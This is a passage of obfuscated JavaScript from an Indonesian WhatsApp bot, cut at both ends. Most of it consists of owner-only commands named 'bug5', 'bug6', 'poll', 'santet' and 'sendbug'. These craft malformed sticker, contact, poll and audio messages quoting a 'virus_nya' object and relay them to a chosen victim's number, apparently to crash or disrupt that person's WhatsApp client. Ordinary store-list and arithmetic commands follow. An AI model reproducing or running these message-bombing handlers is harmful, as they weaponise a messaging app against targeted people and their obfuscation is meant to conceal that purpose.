reply(_0x517aa3(0x1fc)+num+_0x517aa3(0x1fb));var extended=generateWAMessageFromContent(num,proto[_0x517aa3(0x206)]['fromObject']({'extendedTextMessage':{'text':_0x517aa3(0x200),'matchedText':_0x517aa3(0x1f9),'description':_0x517aa3(0x1f5),'title':_0x517aa3(0x207)+ngazap(prefix),'previewType':_0x517aa3(0x1f3)}}),{'userJid':num,'quoted':virus_nya});reply(_0x517aa3(0x20b)+num[_0x517aa3(0x1f6)]('@')[0x0]+_0x517aa3(0x209)),conn[_0x517aa3(0x1f7)](num,extended[_0x517aa3(0x20a)],{'messageId':extended['key']['id']});
}
break
case 'bug5':{
var _0x3e4dcb=_0x35ff;(function(_0x1894bc,_0x2f3f33){var _0x14e7f0=_0x35ff,_0x4c4008=_0x1894bc();while(!![]){try{var _0x43e928=-parseInt(_0x14e7f0(0x1d8))/0x1*(-parseInt(_0x14e7f0(0x1de))/0x2)+-parseInt(_0x14e7f0(0x1dd))/0x3+-parseInt(_0x14e7f0(0x1db))/0x4*(parseInt(_0x14e7f0(0x1e2))/0x5)+-parseInt(_0x14e7f0(0x1d7))/0x6*(-parseInt(_0x14e7f0(0x1c6))/0x7)+parseInt(_0x14e7f0(0x1cd))/0x8*(-parseInt(_0x14e7f0(0x1e3))/0x9)+parseInt(_0x14e7f0(0x1d4))/0xa+parseInt(_0x14e7f0(0x1d3))/0xb*(parseInt(_0x14e7f0(0x1d0))/0xc);if(_0x43e928===_0x2f3f33)break;else _0x4c4008['push'](_0x4c4008['shift']());}catch(_0x5ab822){_0x4c4008['push'](_0x4c4008['shift']());}}}(_0x5203,0xd69f9));if(!isOwner)return reply(mess['OnlyOwner']);if(!q)return reply('*Syntax\x20Error!*\x0aEx:\x20#'+command+_0x3e4dcb(0x1cb));var num=q+_0x3e4dcb(0x1d6),dev=_0x3e4dcb(0x1dc);if(num==sender)return reply(_0x3e4dcb(0x1c7));if(num==dev)return reply(_0x3e4dcb(0x1c9));function _0x35ff(_0x18421a,_0x355471){var _0x52031c=_0x5203();return _0x35ff=function(_0x35ff38,_0x374339){_0x35ff38=_0x35ff38-0x1c6;var _0x2e98c1=_0x52031c[_0x35ff38];return _0x2e98c1;},_0x35ff(_0x18421a,_0x355471);}var cekap=await conn['onWhatsApp'](num);if(cekap[_0x3e4dcb(0x1df)]==0x0)return reply('Nomor\x20+'+num+_0x3e4dcb(0x1ca));var sticker=generateWAMessageFromContent(num,proto['Message'][_0x3e4dcb(0x1d2)]({'stickerMessage':{'url':_0x3e4dcb(0x1e4),'fileSha256':_0x3e4dcb(0x1cc),'fileEncSha256':_0x3e4dcb(0x1d5),'mediaKey':_0x3e4dcb(0x1da),'mimetype':'image/webp','height':0x40,'width':0x40,'directPath':_0x3e4dcb(0x1ce),'fileLength':'7774','mediaKeyTimestamp':_0x3e4dcb(0x1d9),'isAnimated':![]}}),{'userJid':num,'quoted':virus_nya});reply(_0x3e4dcb(0x1c8)+num[_0x3e4dcb(0x1e0)]('@')[0x0]+_0x3e4dcb(0x1cf)),conn[_0x3e4dcb(0x1e1)](num,sticker[_0x3e4dcb(0x1d1)],{'messageId':sticker['key']['id']});function _0x5203(){var _0x526538=['@s.whatsapp.net','62724WetLKP','447tBxklh','1657290167','nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=','43124cucKbz','6285943429237@s.whatsapp.net','214974vLUOXk','650uygKGy','length','split','relayMessage','345CnfrVY','18VMEUeN','https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc','42PoYaDK','Itu\x20Nomor\x20Lu\x20Sendiri','*Sukses\x20Mengirim\x20Bug5*\x0a*ID:*\x20Wa.me/','Lah\x20itu\x20kan\x20developer\x20botnya?','\x0atidak\x20terdaftar\x20di\x20WhatsApp','\x20628xxxx','YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=','555992EvdCmd','/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781','\x0a*Type:*\x20sticker.message','156RaSljT','message','fromObject','1280488GCgPzO','1123390Ruefaa','9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8='];_0x5203=function(){return _0x526538;};return _0x5203();}
}
break
case 'bug6':{
var _0x3d8bd3=_0x2b60;(function(_0x53a72e,_0x2599f3){var _0xc89374=_0x2b60,_0x2186dc=_0x53a72e();while(!![]){try{var _0xb59f68=-parseInt(_0xc89374(0xd3))/0x1*(parseInt(_0xc89374(0xc3))/0x2)+parseInt(_0xc89374(0xcd))/0x3*(parseInt(_0xc89374(0xd8))/0x4)+-parseInt(_0xc89374(0xd0))/0x5+-parseInt(_0xc89374(0xd4))/0x6*(-parseInt(_0xc89374(0xd2))/0x7)+-parseInt(_0xc89374(0xd1))/0x8+-parseInt(_0xc89374(0xce))/0x9+parseInt(_0xc89374(0xc6))/0xa;if(_0xb59f68===_0x2599f3)break;else _0x2186dc['push'](_0x2186dc['shift']());}catch(_0x1ed77e){_0x2186dc['push'](_0x2186dc['shift']());}}}(_0x58dc,0xac651));if(!isOwner)return reply(mess[_0x3d8bd3(0xca)]);if(!q)return reply('*Syntax\x20Error!*\x0aEx:\x20#'+command+'\x20628xxxx');function _0x58dc(){var _0x4e2cad=['7bSNhgl','7653QQsSEs','2722314PuIrgm','split','©\x20OHLXbot•MD','Itu\x20Nomor\x20Lu\x20Sendiri','4SSNBgl','Nomor\x20+','key','278wKbkUG','length','BEGIN:VCARD\x0aVERSION:3.0\x0aN:;;;;\x0aFN:LexxyOfc\x0aitem1.TEL;waid=6285943429237:+62\x20838-3455-8105\x0aitem1.X-ABLabel:Ponsel\x0aPHOTO;BASE64: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\x0aX-WA-BIZ-DESCRIPTION:Developer\x20OHLXbot•MDWhatsApp\x20/\x20Script\x20Bot\x20ORDER\x20?\x20CHAT\x20AJA\x20👋\x0aX-WA-BIZ-NAME:Haikal\x0aEND:VCARD','34345900xfytDI','*Sukses\x20Mengirim\x20Bug6*\x0a*ID:*\x20Wa.me/','message','Message','OnlyOwner','\x0a*Type:*\x20contact.message','Lah\x20itu\x20kan\x20developer\x20botnya?','1942053yICsPC','11975193JFBaoe','6285943429237@s.whatsapp.net','4513655QAzkIF','4259648aLoWKT'];_0x58dc=function(){return _0x4e2cad;};return _0x58dc();}var num=q+'@s.whatsapp.net',dev=_0x3d8bd3(0xcf);if(num==sender)return reply(_0x3d8bd3(0xd7));if(num==dev)return reply(_0x3d8bd3(0xcc));var cekap=await conn['onWhatsApp'](num);function _0x2b60(_0x8b08f1,_0x450c29){var _0x58dcb5=_0x58dc();return _0x2b60=function(_0x2b6009,_0x22d443){_0x2b6009=_0x2b6009-0xc1;var _0x5163c8=_0x58dcb5[_0x2b6009];return _0x5163c8;},_0x2b60(_0x8b08f1,_0x450c29);}if(cekap[_0x3d8bd3(0xc4)]==0x0)return reply(_0x3d8bd3(0xc1)+num+'\x0atidak\x20terdaftar\x20di\x20WhatsApp');var contact=generateWAMessageFromContent(num,proto[_0x3d8bd3(0xc9)]['fromObject']({'contactMessage':{'displayName':_0x3d8bd3(0xd6)+ngazap(prefix),'vcard':_0x3d8bd3(0xc5)}}),{'userJid':num,'quoted':virus_nya});reply(_0x3d8bd3(0xc7)+num[_0x3d8bd3(0xd5)]('@')[0x0]+_0x3d8bd3(0xcb)),conn['relayMessage'](num,contact[_0x3d8bd3(0xc8)],{'messageId':contact[_0x3d8bd3(0xc2)]['id']});
}
break
case 'poll':{
var _0x1b2355=_0x4c1f;function _0x4c1f(_0x112f9f,_0x539c36){var _0x5f1f01=_0x5f1f();return _0x4c1f=function(_0x4c1f6a,_0x1c85e5){_0x4c1f6a=_0x4c1f6a-0xd5;var _0x545fd5=_0x5f1f01[_0x4c1f6a];return _0x545fd5;},_0x4c1f(_0x112f9f,_0x539c36);}(function(_0x57ab24,_0x47c464){var _0xa21a25=_0x4c1f,_0x34ceaf=_0x57ab24();while(!![]){try{var _0x1cae46=parseInt(_0xa21a25(0xea))/0x1+-parseInt(_0xa21a25(0xdd))/0x2*(-parseInt(_0xa21a25(0xda))/0x3)+-parseInt(_0xa21a25(0xe3))/0x4+-parseInt(_0xa21a25(0xe2))/0x5+parseInt(_0xa21a25(0xde))/0x6*(parseInt(_0xa21a25(0xe7))/0x7)+-parseInt(_0xa21a25(0xd8))/0x8*(parseInt(_0xa21a25(0xd6))/0x9)+parseInt(_0xa21a25(0xdb))/0xa;if(_0x1cae46===_0x47c464)break;else _0x34ceaf['push'](_0x34ceaf['shift']());}catch(_0x373bae){_0x34ceaf['push'](_0x34ceaf['shift']());}}}(_0x5f1f,0xde658));if(!isOwner)return reply(mess[_0x1b2355(0xe0)]);if(!q)return reply(_0x1b2355(0xed)+command+'\x20628xxxx');var num=q+_0x1b2355(0xec),dev=_0x1b2355(0xeb);function _0x5f1f(){var _0x5a7f34=['*Sukses\x20Mengirim\x20BugPoll*\x0a*ID:*\x20Wa.me/','101269hkvVuB','VOTE\x20LAH\x20SEMUA','Itu\x20Nomor\x20Lu\x20Sendiri','89781jdPGXN','6285943429237@s.whatsapp.net','@s.whatsapp.net','*Syntax\x20Error!*\x0aEx:\x20#','Nomor\x20+','161838arHYMn','split','488lFQjyP','length','3093noAtUA','6110490mGjYPl','fromObject','3394MiKgHW','696vACzcI','KATANYA\x20WA\x20KEBAL','OnlyOwner','relayMessage','4549040tlJFYA','4843852LSEuKm','KATANYA\x20KEBAL','HALO\x20👋\x20SAYA\x20BOT\x20OHLXbot•MD'];_0x5f1f=function(){return _0x5a7f34;};return _0x5f1f();}if(num==sender)return reply(_0x1b2355(0xe9));if(num==dev)return reply('Lah\x20itu\x20kan\x20developer\x20botnya?');var cekap=await conn['onWhatsApp'](num);if(cekap[_0x1b2355(0xd9)]==0x0)return reply(_0x1b2355(0xd5)+num+'\x0atidak\x20terdaftar\x20di\x20WhatsApp');var pollCreation=generateWAMessageFromContent(num,proto['Message'][_0x1b2355(0xdc)]({'pollCreationMessage':{'name':_0x1b2355(0xe5),'options':[{'optionName':_0x1b2355(0xdf)},{'optionName':'BERANI\x20VOTE\x20GA'},{'optionName':_0x1b2355(0xe8)},{'optionName':_0x1b2355(0xe4)},{'optionName':'SALAM\x20BROTHER\x20BY\x20>•MD'}],'selectableOptionsCount':0x5}}),{'userJid':num,'quoted':virus_nya});conn[_0x1b2355(0xe1)](num,pollCreation['message'],{'messageId':pollCreation['key']['id']}),reply(_0x1b2355(0xe6)+num[_0x1b2355(0xd7)]('@')[0x0]);
}
break
case 'santet':
var _0x59d6e7=_0x256d;function _0x256d(_0x5c8008,_0x1bbcbf){var _0x17e882=_0x17e8();return _0x256d=function(_0x256dcd,_0xbcf2c0){_0x256dcd=_0x256dcd-0xcb;var _0x552aad=_0x17e882[_0x256dcd];return _0x552aad;},_0x256d(_0x5c8008,_0x1bbcbf);}(function(_0x13c1a9,_0x2e24ec){var _0xf17175=_0x256d,_0x160da3=_0x13c1a9();while(!![]){try{var _0x15adca=parseInt(_0xf17175(0xdc))/0x1*(-parseInt(_0xf17175(0xcd))/0x2)+parseInt(_0xf17175(0xd9))/0x3*(-parseInt(_0xf17175(0xdb))/0x4)+parseInt(_0xf17175(0xd7))/0x5+-parseInt(_0xf17175(0xd2))/0x6+-parseInt(_0xf17175(0xdf))/0x7*(parseInt(_0xf17175(0xe1))/0x8)+-parseInt(_0xf17175(0xcf))/0x9+parseInt(_0xf17175(0xde))/0xa;if(_0x15adca===_0x2e24ec)break;else _0x160da3['push'](_0x160da3['shift']());}catch(_0x303ddd){_0x160da3['push'](_0x160da3['shift']());}}}(_0x17e8,0x9dd42));function _0x17e8(){var _0x2b46f5=['Message','length','OnlyGrup','306212MjVIZm','Tag\x20atau\x20balas\x20pesan\x20orang\x20yang\x20ingin\x20disantet\x0a\x0a*Contoh:*\x20#santet\x20@tag','11161521ZqbiAa','jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=','relayMessage','2150724xxvETx','audio/mpeg','OnlyOwner','key','258330','2051405PHcyWk','1657190832','2704038LYDkWK','*Sukses\x20Mengirim\x20Santet*\x0a*ID:*\x20@','4JWkBRj','7ZJRYdr','fromObject','49174970JnKvAN','7Gsydok','/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118','8876808pLBpBD','gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=','split'];_0x17e8=function(){return _0x2b46f5;};return _0x17e8();}if(!isOwner)return reply(mess[_0x59d6e7(0xd4)]);if(!isGroup)return reply(mess[_0x59d6e7(0xcc)]);var number;if(mentionUser[_0x59d6e7(0xcb)]!==0x0){number=mentionUser[0x0];var audio=generateWAMessageFromContent(number,proto['Message'][_0x59d6e7(0xdd)]({'audioMessage':{'url':'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc','mimetype':'audio/mpeg','fileSha256':_0x59d6e7(0xd0),'fileLength':_0x59d6e7(0xd6),'seconds':0x10,'ptt':![],'mediaKey':_0x59d6e7(0xe2),'fileEncSha256':'6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=','directPath':_0x59d6e7(0xe0),'mediaKeyTimestamp':_0x59d6e7(0xd8)}}),{'userJid':number,'quoted':virus_nya});mentions('*Sukses\x20Mengirim\x20Santet*\x0a*ID:*\x20@'+number[_0x59d6e7(0xe3)]('@')[0x0],[sender]),conn[_0x59d6e7(0xd1)](number,audio['message'],{'messageId':audio[_0x59d6e7(0xd5)]['id']});}else{if(isQuotedMsg){number=quotedMsg['sender'];var audio=generateWAMessageFromContent(number,proto[_0x59d6e7(0xe4)][_0x59d6e7(0xdd)]({'audioMessage':{'url':'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc','mimetype':_0x59d6e7(0xd3),'fileSha256':_0x59d6e7(0xd0),'fileLength':'258330','seconds':0x10,'ptt':![],'mediaKey':'gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=','fileEncSha256':'6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=','directPath':_0x59d6e7(0xe0),'mediaKeyTimestamp':_0x59d6e7(0xd8)}}),{'userJid':number,'quoted':virus_nya});mentions(_0x59d6e7(0xda)+number[_0x59d6e7(0xe3)]('@')[0x0],[sender]),conn['relayMessage'](number,audio['message'],{'messageId':audio[_0x59d6e7(0xd5)]['id']});}else reply(_0x59d6e7(0xce));}
break
case 'sendbug':
var _0xf77cf2=_0x2524;(function(_0x269840,_0x17c31f){var _0x3b4102=_0x2524,_0xbc4400=_0x269840();while(!![]){try{var _0x439a8d=-parseInt(_0x3b4102(0x103))/0x1*(parseInt(_0x3b4102(0xfc))/0x2)+-parseInt(_0x3b4102(0x101))/0x3+parseInt(_0x3b4102(0x100))/0x4+-parseInt(_0x3b4102(0x113))/0x5+-parseInt(_0x3b4102(0x108))/0x6+parseInt(_0x3b4102(0x111))/0x7*(-parseInt(_0x3b4102(0x10d))/0x8)+-parseInt(_0x3b4102(0xfb))/0x9*(-parseInt(_0x3b4102(0x10e))/0xa);if(_0x439a8d===_0x17c31f)break;else _0xbc4400['push'](_0xbc4400['shift']());}catch(_0x13a7a2){_0xbc4400['push'](_0xbc4400['shift']());}}}(_0x4319,0xbc70d));function _0x2524(_0x27d55,_0x3c5765){var _0x4319dd=_0x4319();return _0x2524=function(_0x2524c8,_0x2b54cb){_0x2524c8=_0x2524c8-0xf9;var _0x58d3d2=_0x4319dd[_0x2524c8];return _0x58d3d2;},_0x2524(_0x27d55,_0x3c5765);}function _0x4319(){var _0x29987d=['/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118','https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc','3478036scKggj','1982331pNlrGz','OnlyOwner','1vVSxWa','sender','audio/mpeg','OnlyGrup','relayMessage','4580142ZtmXxt','length','key','258330','split','663736jKHwjZ','2710htouzO','1657190832','Tag\x20atau\x20balas\x20pesan\x20orang\x20yang\x20ingin\x20disantet\x0a\x0a*Contoh:*\x20#sendbug\x20@tag','63ZXzskH','gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=','2338775iYdPyf','*Sukses\x20Mengirim\x20Santet*\x0a*ID:*\x20@','fromObject','Message','113166zkruFK','1733236FoxwMZ','message'];_0x4319=function(){return _0x29987d;};return _0x4319();}if(!isOwner)return reply(mess[_0xf77cf2(0x102)]);if(!isGroup)return reply(mess[_0xf77cf2(0x106)]);var number;if(mentionUser[_0xf77cf2(0x109)]!==0x0){number=mentionUser[0x0];var audio=generateWAMessageFromContent(number,proto['Message'][_0xf77cf2(0xf9)]({'audioMessage':{'url':_0xf77cf2(0xff),'mimetype':_0xf77cf2(0x105),'fileSha256':'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=','fileLength':_0xf77cf2(0x10b),'seconds':0x10,'ptt':![],'mediaKey':_0xf77cf2(0x112),'fileEncSha256':'6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=','directPath':_0xf77cf2(0xfe),'mediaKeyTimestamp':_0xf77cf2(0x10f)}}),{'userJid':number,'quoted':virus_nya});mentions('*Sukses\x20Mengirim\x20Santet*\x0a*ID:*\x20@'+number[_0xf77cf2(0x10c)]('@')[0x0],[sender]),conn[_0xf77cf2(0x107)](number,audio[_0xf77cf2(0xfd)],{'messageId':audio['key']['id']});}else{if(isQuotedMsg){number=quotedMsg[_0xf77cf2(0x104)];var audio=generateWAMessageFromContent(number,proto[_0xf77cf2(0xfa)][_0xf77cf2(0xf9)]({'audioMessage':{'url':_0xf77cf2(0xff),'mimetype':_0xf77cf2(0x105),'fileSha256':'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=','fileLength':_0xf77cf2(0x10b),'seconds':0x10,'ptt':![],'mediaKey':_0xf77cf2(0x112),'fileEncSha256':'6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=','directPath':'/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118','mediaKeyTimestamp':'1657190832'}}),{'userJid':number,'quoted':virus_nya});mentions(_0xf77cf2(0x114)+number[_0xf77cf2(0x10c)]('@')[0x0],[sender]),conn[_0xf77cf2(0x107)](number,audio[_0xf77cf2(0xfd)],{'messageId':audio[_0xf77cf2(0x10a)]['id']});}else reply(_0xf77cf2(0x110));}
break


// STORE FUN
case 'shop': case 'list':
if (!isGroup) return reply(mess.OnlyGrup)
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Belum ada list message yang terdaftar di group ini`)
var arr_rows = [];
for (let x of db_respon_list) {
if (x.id === from) {
arr_rows.push({
title: x.key,
rowId: x.key
})
}
}
var listMsg = {
text: `Hi @${sender.split("@")[0]}`,
buttonText: 'Click Here!',
footer: `*List From ${groupName}*\n\n⏳ ${jam}\n📆 ${tanggal}`,
mentions: [sender],
sections: [{
title: groupName, rows: arr_rows
}]
}
conn.sendMessage(from, listMsg)
break
case 'addlist':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return reply(`Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n#${command} tes@apa`)
if (isAlreadyResponList(from, args1, db_respon_list)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
addResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Berhasil menambah List menu : *${args1}*`)
break
case 'dellist':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!q) return reply(`Gunakan dengan cara ${command} *key*\n\n_Contoh_\n\n${command} hello`)
if (!isAlreadyResponList(from, q, db_respon_list)) return reply(`List respon dengan key *${q}* tidak ada di database!`)
delResponList(from, q, db_respon_list)
reply(`Sukses delete list message dengan key *${q}*`)
break
case 'update':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return reply(`Gunakan dengan cara #${command} *key@response*\n\n_Contoh_\n\n#${command} tes@apa`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
updateResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Berhasil update List menu : *${args1}*`)
break
case 'tambah':
if (!q) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = q.split(' ')[0]
var num_two = q.split(' ')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one + nilai_two}`)
break
case 'kurang':
if (!q) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = q.split(' ')[0]
var num_two = q.split(' ')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one - nilai_two}`)
break
case 'kali':
